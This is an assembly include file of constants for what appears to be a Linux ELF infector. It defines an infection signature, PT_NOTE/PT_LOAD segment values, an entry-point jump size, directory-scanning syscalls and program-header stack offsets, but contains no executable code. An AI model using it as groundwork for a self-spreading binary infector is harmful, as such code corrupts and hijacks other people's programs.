; Utils
%define ELF64_MAGIC	0x464c457f
%define SCOTT_SIGNATURE	0x41424344
%define VADDR		0xc000000
%define ALIGN		0x200000
%define STACK_SIZE	4096
%define DIRENT_SIZE	1024
%define EHDR_SIZE	64
%define JMP_REL_SIZE	5
%define STDOUT		1
%define ELFCLASS64	2
%define O_RDONLY	0
%define O_RDWR		2
%define SEEK_END	2
%define DT_REG		8
%define PT_LOAD		1
%define PT_NOTE		4
%define PF_X		1
%define PF_R		4

; Syscalls
%define SYS_READ	0
%define SYS_WRITE	1
%define SYS_OPEN	2
%define SYS_CLOSE	3
%define SYS_FSTAT	5 
%define SYS_LSEEK	8
%define SYS_PREAD64	17
%define SYS_PWRITE64	18
%define SYS_EXIT	60
%define SYS_SYNC	162
%define SYS_GETDENTS64	217

; Stack buffer offsets
%define STAT 0
%define ST_SIZE 48
%define EHDR 144
%define EHDR_CLASS 148
%define EHDR_PAD 153
%define EHDR_ENTRY 168
%define EHDR_PHOFF 176
%define EHDR_PHENTSIZE 198
%define EHDR_PHNUM 200
%define PHDR_TYPE 208
%define PHDR_FLAGS 212
%define PHDR_OFFSET 216
%define PHDR_VADDR 224
%define PHDR_PADDR 232
%define PHDR_FILESZ 240
%define PHDR_MEMSZ 248
%define PHDR_ALIGN 256
%define JMP_REL 300
%define DIR_SIZE 350
%define DIRENT 400
%define DIRENT_D_RECLEN 416
%define DIRENT_D_TYPE 418
%define DIRENT_D_NAME 419